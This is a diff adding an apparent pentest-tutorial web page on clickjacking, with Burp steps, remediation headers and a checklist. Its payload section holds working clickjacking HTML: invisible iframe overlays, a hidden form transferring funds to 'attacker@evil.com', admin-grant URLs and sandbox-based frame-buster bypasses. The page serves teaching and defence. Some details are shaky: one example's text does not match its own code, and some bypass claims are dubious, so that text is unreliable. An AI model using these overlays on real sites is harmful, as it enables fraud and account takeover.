@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Clickjacking defense: hide content until JS confirms top frame -->
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Clickjacking testing guide: frame injection, UI redressing attacks, X-Frame-Options bypass, and CSP misconfiguration exploitation.">
+    <meta property="og:title" content="Clickjacking – Web App Pentesting Guide">
+    <meta property="og:description" content="Clickjacking testing guide: frame injection, UI redressing attacks, X-Frame-Options bypass, and CSP misconfiguration exploitation.">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%237c3aed' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <title>Clickjacking  · Web Pentest Playbook</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<nav class="topnav">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon">
+        <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><path d="M5 9v3M9 9v3M3.5 12h7" stroke="#a78bfa" stroke-width="1.2" stroke-linecap="round"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+      </div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2025</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html" class="nav-link active">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+    <a href="../thanks.html" class="nav-link">Thanks</a>
+  </div>
+  <div class="nav-right">
+    <button class="search-pill" onclick="gsOpen ? gsOpen() : null">
+      <svg width="11" height="11" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="5" stroke="currentColor" stroke-width="1.5"/><path d="m11 11 3 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+      Search <kbd>⌘K</kbd>
+    </button>
+    <button class="hamburger" id="hamburger" aria-label="Menu">☰</button>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">☀ Light</button>
+  </div>
+</nav>
+<div class="layout">
+  <nav id="sidebar">
+    <div class="toc-title">Clickjacking</div>
+    <div class="sb-group">Overview</div>
+    <a href="#analogy">Real-World Analogy</a>
+    <a href="#methodology">📅 Workflow Placement</a>
+    <a href="#how-it-works">How It Works</a>
+    <div class="sb-group">Attack Vectors</div>
+    <a href="#where-to-look">Where to Look</a>
+    <div class="sb-group">Exploitation</div>
+    <a href="#burp-workflow">Burp Workflow</a>
+    <a href="#payloads">Payloads & Techniques</a>
+    <a href="#waf-bypass">🛡️ WAF Bypass</a>
+    <a href="#exploitation">Exploitation & Impact</a>
+    <div class="sb-group">Practice</div>
+    <a href="#checklist">Testing Checklist</a>
+    <a href="#remediation">Remediation</a>
+    <a href="#labs">PortSwigger Labs</a>
+    <a href="#mistakes">Common Mistakes</a>
+    <a href="#see-also">See Also</a>
+  </nav>
+  <div class="sidebar-overlay" id="sidebar-overlay"></div>
+  <main id="main">
+    <div class="hero">
+      <div class="hero-chip"><span class="hero-chip-dot"></span>OWASP A05 · CVSS 7.1 · Day 3</div>
+      <h1><span class="hero-icon-pill"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><path d="m9 9 5 12 1.8-5.2L21 14z"/><path d="M7.2 2.2 8 5.1"/><path d="m5.1 8-2.9-.8"/><path d="M14 4.1 12 6"/><path d="m6 12-1.9 2"/></svg></span><span>Clickjacking</span></h1>
+      <p>Clickjacking (also called UI redressing) is an attack where an attacker overlays a transparent or hidden iframe containing a victim website on top of a fake decoy page. When users click what they think is a button on the decoy, they're actually clicking a hidden element on the victim site, triggering unintended actions like deleting accounts, transferring funds, or changing settings.</p>
+      <div class="badge-row">
+        <span class="badge badge-medium">MEDIUM</span>
+        <span class="badge badge-bscp">BSCP</span>
+        <span class="badge badge-difficulty">Beginner</span>
+      </div>
+    </div>
+
+    <section id="analogy">
+      <h2>Real-World Analogy</h2>
+      <div class="callout analogy">
+        <div class="callout-title">📖 The Transparent Sheet of Glass</div>
+        <p>Imagine a transparent sheet of glass placed over a "Win a Prize!" button. Behind the glass, there's another website with a "Delete Account" button positioned directly under where the glass is. When you see the "Win a Prize!" button and click on it, you think you're clicking the decoy. But you're actually clicking through the transparent glass to the hidden "Delete Account" button underneath. You've been clickjacked.</p>
+      </div>
+    </section>
+
+    <section id="methodology">
+      <h2>📅 When in the 5-Day Workflow</h2>
+      <div class="workflow-days">
+        <div class="day-pill probe"><span class="day-num">Day 1</span>Check Headers</div>
+        <div class="day-pill"><span class="day-num">Day 2</span>Auth/IDOR</div>
+        <div class="day-pill"><span class="day-num">Day 3</span>File/CSRF</div>
+        <div class="day-pill deep"><span class="day-num">Day 4</span>Build PoC</div>
+        <div class="day-pill"><span class="day-num">Day 5</span>Deep Dive</div>
+      </div>
+
+      <div class="callout method-probe">
+        <div class="callout-title">🎯 Day 1  · Quick Binary Check</div>
+        <p>On Day 1, perform a quick recon: check if the target's response headers include <code>X-Frame-Options</code> or <code>Content-Security-Policy: frame-ancestors</code>. If either is missing or set to <code>ALLOWALL</code>, the site may be vulnerable to clickjacking.</p>
+        <p><strong>Quick check in Burp:</strong> Intercept any response → check headers → look for <code>X-Frame-Options: DENY</code> or <code>CSP frame-ancestors 'none'</code>. If neither exists, note it as a potential vulnerability.</p>
+      </div>
+
+      <div class="callout method-deep">
+        <div class="callout-title">🎯 Day 4  · Build a Real PoC</div>
+        <p>On Day 4, if headers are missing, build a working clickjacking proof-of-concept. Create an HTML page with a fake button that overlays a transparent iframe pointing to a sensitive action endpoint (e.g., account deletion or admin grant). Test it in a browser to confirm the attack works. This proves the vulnerability is exploitable in the real world.</p>
+      </div>
+    </section>
+
+    <section id="how-it-works">
+      <h2>How It Works</h2>
+      <p>Clickjacking relies on framing ·the ability to embed one website inside another using an iframe. Here's the flow:</p>
+      <ol class="steps">
+        <li>Attacker creates a decoy webpage with attractive buttons ("Claim Prize!", "Watch Video")</li>
+        <li>Attacker embeds the victim website in a transparent iframe above the decoy button</li>
+        <li>User sees the decoy button and clicks it (unaware of the iframe)</li>
+        <li>Click passes through the transparent iframe to the victim site below</li>
+        <li>Victim site performs an action the user didn't intend (delete account, change settings, follow user, transfer funds)</li>
+      </ol>
+
+      <p><strong>Why it works:</strong> By default, browsers allow any website to embed any other website in an iframe. If the victim site doesn't send the <code>X-Frame-Options: DENY</code> or <code>CSP frame-ancestors 'none'</code> headers, there's no technical barrier to framing. The attack exploits user psychology (not paying attention to what they're clicking) combined with this lack of framing protection.</p>
+
+      <p><strong>Simple vulnerable example:</strong></p>
+      <pre><code>&lt;style&gt;
+  iframe {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    opacity: 0.001;  /* Invisible but still clickable */
+    z-index: 999;
+  }
+&lt;/style&gt;
+
+&lt;h1&gt;Click here to claim your prize!&lt;/h1&gt;
+&lt;button style="font-size: 30px; padding: 20px;"&gt;CLAIM PRIZE&lt;/button&gt;
+
+&lt;!-- Hidden iframe containing the victim site --&gt;
+&lt;iframe src="https://bank.com/transfer?amount=1000&to=attacker@evil.com"&gt;&lt;/iframe&gt;
+</code></pre>
+
+      <p>When the user clicks the "CLAIM PRIZE" button, they're actually clicking the delete button on the hidden iframe.</p>
+    </section>
+
+    <section id="where-to-look">
+      <h2>Where to Look</h2>
+      <p>Test clickjacking on any endpoint that performs a state-changing action and is accessible to an authenticated user:</p>
+      <ul>
+        <li><strong>Account management:</strong> Delete account, change password, add two-factor authentication</li>
+        <li><strong>Financial transactions:</strong> Transfer funds, change bank details, request withdrawal</li>
+        <li><strong>Administrative actions:</strong> Add admin user, change system settings, disable security features</li>
+        <li><strong>Social interactions:</strong> Follow/unfollow user, change privacy settings, send messages</li>
+        <li><strong>Data modification:</strong> Change email, update profile, delete records</li>
+      </ul>
+
+      <p><strong>First, check response headers:</strong> Every response from the target should include protection headers. In Burp, intercept any request and check the response for:</p>
+      <pre><code>X-Frame-Options: DENY
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: frame-ancestors 'none'
+Content-Security-Policy: frame-ancestors 'self'</code></pre>
+
+      <p>If these headers are absent or set to <code>ALLOWALL</code>, clickjacking is possible. If headers say <code>SAMEORIGIN</code> or <code>'self'</code>, they only protect if the site can't be framed from different origins ·but you might still frame it from the same origin if you have control over a subdomain or can conduct cross-origin tricks.</p>
+    </section>
+
+    <section id="burp-workflow">
+      <h2>Burp Suite Workflow</h2>
+
+      <div class="burp-step">
+        <div class="step-num">1</div>
+        <div>
+          <h3>Intercept a Request to a State-Changing Endpoint</h3>
+          <p>Find an action that modifies state: account deletion, password change, admin grant, etc. Intercept the request in Burp Proxy.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">2</div>
+        <div>
+          <h3>Check Response Headers for Frame-Ancestors Protection</h3>
+          <p>Look at the response headers. Search for:</p>
+          <pre><code>X-Frame-Options
+Content-Security-Policy</code></pre>
+          <p>If neither header is present, or if X-Frame-Options is set to <code>ALLOWALL</code>, the page is likely vulnerable to clickjacking.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">3</div>
+        <div>
+          <h3>Use Burp's Clickjacking PoC Generator</h3>
+          <p>Right-click on the request in Proxy or Repeater → <strong>Engagement tools</strong> → <strong>Generate Clickjacking PoC</strong>. Burp will generate an HTML file that frames the vulnerable endpoint with a decoy button on top.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">4</div>
+        <div>
+          <h3>Save and Open the PoC in a Browser</h3>
+          <p>Burp generates an HTML file. Open it in a browser (not from the Burp proxy, to avoid auth issues). You should see a decoy button. Click it.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">5</div>
+        <div>
+          <h3>Verify the Hidden Action Was Triggered</h3>
+          <p>If clickjacking works, the hidden action (e.g., account delete, admin grant) should execute. Check the target application to confirm: if you were testing account deletion, the account should now be deleted. If testing admin grant, the user should now be an admin.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">6</div>
+        <div>
+          <h3>Test Frame-Busting Bypass (Optional)</h3>
+          <p>Some sites include JavaScript that breaks out of frames (frame-busting code like <code>if (top !== self) { top.location = self.location; }</code>). Try embedding the PoC with the iframe's <code>sandbox</code> attribute to disable frame-busting:</p>
+          <pre><code>&lt;iframe sandbox="allow-same-origin allow-forms allow-scripts"
+        src="https://target.com/action"&gt;&lt;/iframe&gt;</code></pre>
+          <p>The <code>sandbox</code> attribute can prevent frame-busting JavaScript from executing.</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="payloads">
+      <h2>Payloads & Techniques</h2>
+
+      <h3>Basic Clickjacking PoC (Transparent Iframe)</h3>
+      <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;title&gt;Clickjacking PoC&lt;/title&gt;
+  &lt;style&gt;
+    body { background: #f0f0f0; font-family: Arial; padding: 50px; }
+    .decoy {
+      width: 300px;
+      padding: 20px;
+      background: #ff6600;
+      color: white;
+      font-size: 24px;
+      text-align: center;
+      cursor: pointer;
+      border-radius: 5px;
+      user-select: none;
+    }
+    iframe {
+      position: absolute;
+      top: 100px;
+      left: 50px;
+      width: 300px;
+      height: 60px;
+      opacity: 0.001;  /* Invisible */
+      z-index: 999;
+    }
+  &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;Congratulations!&lt;/h1&gt;
+  &lt;div class="decoy" onclick="alert('You clicked the decoy!')"&gt;
+    CLICK HERE TO CLAIM YOUR PRIZE!
+  &lt;/div&gt;
+
+  &lt;!-- Hidden victim iframe --&gt;
+  &lt;iframe src="https://target.com/account/delete"&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+      <h3>Prefilled Form Clickjacking</h3>
+      <p>For POST-based actions, use a hidden form that auto-submits:</p>
+      <pre><code>&lt;form id="clickjack" action="https://target.com/transfer" method="POST"
+      style="position: absolute; top: 100px; left: 50px; opacity: 0.001; z-index: 999;"&gt;
+  &lt;input type="hidden" name="amount" value="1000"&gt;
+  &lt;input type="hidden" name="recipient" value="attacker@evil.com"&gt;
+  &lt;input type="submit" value="Click here"&gt;
+&lt;/form&gt;
+
+&lt;div class="decoy"&gt;CLICK TO CLAIM PRIZE&lt;/div&gt;</code></pre>
+
+      <h3>Iframe with Sandbox Bypass</h3>
+      <p>If the target has frame-busting JavaScript, use the sandbox attribute to disable it:</p>
+      <pre><code>&lt;iframe sandbox="allow-same-origin allow-forms allow-scripts"
+        src="https://target.com/admin/grant?user=attacker&role=admin"&gt;&lt;/iframe&gt;</code></pre>
+
+      <h3>Double-Iframe Trick</h3>
+      <p>Some sites use X-Frame-Options: SAMEORIGIN but can be framed from a subdomain or via data:// URLs:</p>
+      <pre><code>&lt;iframe src="data:text/html,
+  &lt;iframe src='https://target.com/action'&gt;&lt;/iframe&gt;
+"&gt;&lt;/iframe&gt;</code></pre>
+
+      <h3>Clickjacking with Drag-Drop</h3>
+      <p>Trick users into dragging an element over a hidden button:</p>
+      <pre><code>&lt;div draggable="true" id="fake" style="width: 200px; height: 100px; background: red;"&gt;
+  Drag me to the drop zone
+&lt;/div&gt;
+&lt;iframe src="https://target.com/sensitive-action"
+        style="position: absolute; opacity: 0.001; z-index: 999; width: 200px; height: 100px;"&gt;&lt;/iframe&gt;</code></pre>
+    </section>
+
+    <section id="checklist">
+      <h2>Testing Checklist</h2>
+      <div class="checklist-wrap">
+        <div class="checklist-header">Progress: <span class="progress-mini">0/11</span></div>
+        <div class="progress-bar-wrap"><div class="progress-bar"></div></div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c1">
+          <label for="c1">Identified all state-changing endpoints (delete, transfer, admin grant, settings change)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c2">
+          <label for="c2">Checked response headers for X-Frame-Options on each endpoint</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c3">
+          <label for="c3">Checked response headers for Content-Security-Policy frame-ancestors</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c4">
+          <label for="c4">Generated or manually created clickjacking PoC using Burp tool</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c5">
+          <label for="c5">Tested transparent iframe overlay PoC in browser</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c6">
+          <label for="c6">Verified that clicking decoy button triggered hidden action</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c7">
+          <label for="c7">Tested frame-busting bypass using iframe sandbox attribute</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c8">
+          <label for="c8">Tested POST-based actions with hidden form submission</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c9">
+          <label for="c9">Documented PoC HTML with proof that action executed</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c10">
+          <label for="c10">Tested on multiple sensitive endpoints (account, admin, financial)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c11">
+          <label for="c11">Reported severity based on impact (critical if account delete, medium otherwise)</label>
+        </div>
+      </div>
+    </section>
+
+    <section id="waf-bypass">
+      <h2>WAF Bypass Techniques</h2>
+
+      <h3>CSP `frame-ancestors` Bypass via Subdomain</h3>
+      <p>If <code>frame-ancestors</code> is set to <code>*.example.com</code>, host your page on a compromised subdomain (e.g., <code>attacker.example.com</code>) to satisfy the wildcard.</p>
+
+      <h3>X-Frame-Options: ALLOW-FROM Obsolescence</h3>
+      <p><code>ALLOW-FROM</code> is not supported in Chrome/Firefox. If the server sends <code>X-Frame-Options: ALLOW-FROM https://trusted.com</code> but no <code>frame-ancestors</code> CSP, modern browsers will allow framing from any origin.</p>
+
+      <h3>Sandbox Attribute Tricks</h3>
+      <p><code>&lt;iframe sandbox="allow-forms allow-scripts allow-same-origin"&gt;</code>  · <code>allow-same-origin</code> combined with <code>allow-scripts</code> can bypass sandboxing entirely. Test if removing specific sandbox flags enables the attack.</p>
+
+      <h3>Double iframe</h3>
+      <p>Nest iframes: outer from allowed origin → inner loads target. If only the outer frame's origin is checked for X-Frame-Options, the inner frame is unprotected.</p>
+
+      <h3>Meta Refresh + iframe</h3>
+      <p>Use <code>&lt;meta http-equiv="refresh"&gt;</code> to redirect the page into an iframe context. Bypasses some JavaScript frame-busting checks that run on load.</p>
+
+      <h3>Drag-and-drop Jacking</h3>
+      <p>Instead of click, use HTML5 drag-and-drop. Many clickjacking defenses only address click events; drag-and-drop on invisible elements can still steal data.</p>
+    </section>
+
+    <section id="exploitation">
+      <h2>Exploitation & Impact</h2>
+
+      <h3>Account Takeover</h3>
+      <p>Frame the email change or password reset endpoint. Trick the user into clicking a decoy button, which silently changes their email or initiates a password reset to an attacker-controlled email. Attacker then resets the password and takes over the account.</p>
+
+      <h3>Financial Loss</h3>
+      <p>Frame a money transfer endpoint with a prefilled form. User clicks a fake "Free Gift Card" button, which actually submits a transfer of $1,000 to the attacker's account.</p>
+
+      <h3>Privilege Escalation</h3>
+      <p>Frame an "Add Admin User" endpoint. Trick an existing admin into clicking a decoy, which grants admin rights to an attacker-controlled account.</p>
+
+      <h3>Disable Security Features</h3>
+      <p>Frame endpoints that disable two-factor authentication, change recovery emails, or modify security settings. Trick a user into clicking, which disables their 2FA, making their account easier to compromise later.</p>
+
+      <div class="callout danger">
+        <div class="callout-title">🚨 Real-World Impact</div>
+        <p>In 2010, researchers demonstrated clickjacking against Twitter by framing the "Follow User" endpoint. They created a decoy game that, when clicked, silently followed a malicious account. In another case, an attacker framed a bank's "Transfer Funds" endpoint and tricked users into transferring money just by clicking on what appeared to be a lottery link.</p>
+      </div>
+    </section>
+
+    <section id="remediation">
+      <h2>Remediation</h2>
+
+      <h3>1. Send X-Frame-Options Header (Legacy)</h3>
+      <p>The X-Frame-Options header is the original defense. Set it to DENY to prevent any framing:</p>
+      <pre><code>X-Frame-Options: DENY</code></pre>
+      <p>This works in all modern browsers but is deprecated in favor of CSP.</p>
+
+      <h3>2. Send Content-Security-Policy: frame-ancestors (Modern)</h3>
+      <p>CSP frame-ancestors is more flexible and the recommended approach:</p>
+      <pre><code>Content-Security-Policy: frame-ancestors 'none'</code></pre>
+      <p>Or allow framing only from the same site:</p>
+      <pre><code>Content-Security-Policy: frame-ancestors 'self'</code></pre>
+
+      <h3>3. Combine Both Headers</h3>
+      <p>For maximum compatibility, send both:</p>
+      <pre><code>X-Frame-Options: DENY
+Content-Security-Policy: frame-ancestors 'none'</code></pre>
+
+      <h3>4. Server-Side Implementation Examples</h3>
+      <p><strong>Node.js/Express:</strong></p>
+      <pre><code>app.use((req, res, next) => {
+  res.setHeader('X-Frame-Options', 'DENY');
+  res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
+  next();
+});</code></pre>
+
+      <p><strong>Apache:</strong></p>
+      <pre><code>&lt;Directory /var/www/html&gt;
+  Header always set X-Frame-Options "DENY"
+  Header always set Content-Security-Policy "frame-ancestors 'none'"
+&lt;/Directory&gt;</code></pre>
+
+      <p><strong>Nginx:</strong></p>
+      <pre><code>server {
+  add_header X-Frame-Options "DENY" always;
+  add_header Content-Security-Policy "frame-ancestors 'none'" always;
+}</code></pre>
+
+      <h3>5. Frame-Busting JavaScript (Not Reliable)</h3>
+      <p>Do NOT rely solely on JavaScript to break out of frames, as it can be bypassed. If you do include it:</p>
+      <pre><code>if (top !== self) {
+  top.location = self.location;
+}</code></pre>
+      <p>This breaks out of frames, but the sandbox attribute or other tricks can prevent it from executing.</p>
+
+      <h3>6. Require User Confirmation for Sensitive Actions</h3>
+      <p>Always require an explicit confirmation (separate button click, CAPTCHA, or one-time code) for sensitive operations. This makes clickjacking harder because the attacker must orchestrate multiple clicks.</p>
+    </section>
+
+    <section id="labs">
+      <h2>PortSwigger Labs</h2>
+      <ul>
+        <li><strong>Lab: Basic clickjacking with CSRF token validation:</strong> Frame an action protected by CSRF token</li>
+        <li><strong>Lab: Clickjacking with form input data prefilled from URL parameters:</strong> Exploit pre-filled forms</li>
+        <li><strong>Lab: Clickjacking with a frame buster script:</strong> Bypass frame-busting with sandbox attribute</li>
+        <li><strong>Lab: Exploiting clickjacking vulnerability to perform admin actions:</strong> Frame an admin endpoint</li>
+        <li><strong>Lab: Exploiting click-based clickjacking with a decoy web page:</strong> Multi-step click exploitation</li>
+      </ul>
+    </section>
+
+    <section id="mistakes">
+      <h2>Common Beginner Mistakes</h2>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Only Checking Headers Without Building PoC</div>
+        <p><strong>Mistake:</strong> Checking X-Frame-Options header and reporting vulnerability based on that alone, without actually building a working PoC.</p>
+        <p><strong>Fix:</strong> Always build a real PoC HTML file and test it in a browser. Some sites claim to allow framing but have additional JavaScript defenses.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Testing Only GET Requests</div>
+        <p><strong>Mistake:</strong> Only testing endpoints accessible via GET, ignoring POST-based actions.</p>
+        <p><strong>Fix:</strong> Test POST actions by embedding a hidden form in your PoC that auto-submits.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Forgetting About Frame-Busting Bypass</div>
+        <p><strong>Mistake:</strong> Assuming frame-busting JavaScript prevents clickjacking entirely.</p>
+        <p><strong>Fix:</strong> Try using the iframe sandbox attribute to disable JavaScript: <code>sandbox="allow-same-origin allow-forms"</code>. This can bypass frame-busting.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Not Considering CSRF Token or Session Cookies</div>
+        <p><strong>Mistake:</strong> Forgetting that clickjacking only works if the user is already logged in. If the action requires a CSRF token, the attacker needs to trick the logged-in user.</p>
+        <p><strong>Fix:</strong> Remember to test while logged in. If the action requires a fresh CSRF token in the URL, craft the PoC to include the current token.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Reporting All Clickjacking as "High" Severity</div>
+        <p><strong>Mistake:</strong> Treating all clickjacking the same way. Clickjacking severity depends on what action is being exploited.</p>
+        <p><strong>Fix:</strong> Frame deletion, financial transfer, or admin grant → Critical/High. Frame less sensitive actions (follow user, change preferences) → Medium/Low.</p>
+      </div>
+    </section>
+
+    <section id="see-also">
+      <h2>See Also</h2>
+      <div class="see-also-grid">
+        <a href="csrf.html" class="see-also-card">
+          <div class="sa-icon">🛡️</div>
+          <div class="sa-name">CSRF</div>
+          <div class="sa-why">Clickjacking often requires CSRF tokens to exploit. CSRF covers token validation bypasses.</div>
+        </a>
+        <a href="xss.html" class="see-also-card">
+          <div class="sa-icon">💉</div>
+          <div class="sa-name">XSS</div>
+          <div class="sa-why">XSS can be used to bypass frame-busting scripts or exploit additional vulnerabilities within a clickjacked frame.</div>
+        </a>
+        <a href="cors.html" class="see-also-card">
+          <div class="sa-icon">🔗</div>
+          <div class="sa-name">CORS</div>
+          <div class="sa-why">CORS misconfigurations can allow cross-origin framing in ways that make clickjacking exploitation easier.</div>
+        </a>
+        <a href="host-header.html" class="see-also-card">
+          <div class="sa-icon">🌐</div>
+          <div class="sa-name">Host Header Injection</div>
+          <div class="sa-why">Host header attacks can manipulate CSP and X-Frame-Options policies, enabling clickjacking on otherwise protected pages.</div>
+        </a>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<script>
+document.querySelectorAll('pre').forEach(pre => {
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn'; btn.textContent = 'Copy';
+  pre.appendChild(btn);
+  btn.addEventListener('click', () => {
+    navigator.clipboard.writeText(pre.querySelector('code')?.innerText || pre.innerText);
+    btn.textContent = 'Copied!'; btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+});
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) document.querySelectorAll('#sidebar a').forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id));
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+document.querySelectorAll('[id]').forEach(s => observer.observe(s));
+const SK = 'clickjacking-cl-';
+document.querySelectorAll('.checklist-item input[type=checkbox]').forEach((cb, i) => {
+  if (localStorage.getItem(SK+i) === 'true') { cb.checked = true; cb.closest('.checklist-item').classList.add('done'); }
+  cb.addEventListener('change', () => {
+    localStorage.setItem(SK+i, cb.checked);
+    cb.closest('.checklist-item').classList.toggle('done', cb.checked);
+    updateProgress();
+  });
+});
+function updateProgress() {
+  document.querySelectorAll('.checklist-wrap').forEach(w => {
+    const all = w.querySelectorAll('input[type=checkbox]'), done = w.querySelectorAll('input:checked');
+    const m = w.querySelector('.progress-mini'), b = w.querySelector('.progress-bar');
+    if (m) m.textContent = done.length+'/'+all.length;
+    if (b) b.style.width = (all.length ? done.length/all.length*100 : 0)+'%';
+  });
+}
+updateProgress();
+</script>
+<script>
+(function(){
+  var t = localStorage.getItem('theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', t);
+  var btn = document.getElementById('theme-toggle');
+  if(btn){
+    btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+    btn.addEventListener('click', function(){
+      var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', n);
+      localStorage.setItem('theme', n);
+      btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+    });
+  }
+  var ham = document.getElementById('hamburger');
+  var sb = document.getElementById('sidebar');
+  var ov = document.getElementById('sidebar-overlay');
+  if(ham && sb && ov){
+    ham.addEventListener('click', function(){ sb.classList.toggle('open'); ov.classList.toggle('open'); });
+    ov.addEventListener('click', function(){ sb.classList.remove('open'); ov.classList.remove('open'); });
+  }
+})();
+</script>
+<script src="search.js"></script>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="../index.html" class="footer-logo-link">
+          <div class="footer-logo-icon">
+            <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg" width="15" height="15"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+          </div>
+          <span class="footer-logo-text">Web Pentest Playbook</span>
+        </a>
+        <p class="footer-tagline">A workflow-first reference for web application security testing.</p>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Vulnerabilities</div>
+        <a href="sqli.html" class="footer-link">SQL Injection</a>
+        <a href="xss.html" class="footer-link">XSS</a>
+        <a href="ssrf.html" class="footer-link">SSRF</a>
+        <a href="jwt.html" class="footer-link">JWT Attacks</a>
+        <a href="../index.html" class="footer-link">+ 19 more →</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Resources</div>
+        <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="footer-link">PortSwigger Academy ↗</a>
+        <a href="https://owasp.org/Top10" target="_blank" rel="noopener noreferrer" class="footer-link">OWASP Top 10 ↗</a>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer" class="footer-link">PayloadsAllTheThings ↗</a>
+        <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener noreferrer" class="footer-link">HackTricks ↗</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">About</div>
+        <a href="../web-pentest-playbook.html" class="footer-link">5-Day Playbook</a>
+        <a href="../index.html" class="footer-link">All Vulnerabilities</a>
+        <a href="../thanks.html" class="footer-link">Special Thanks</a>
+        <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub ↗</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2025 Web Pentest Playbook · MIT License</span>
+      <span>Inspired by <a href="../thanks.html">Tomer Hadad</a></span>
+    </div>
+  </div>
+</footer>
+</body>
+</html>
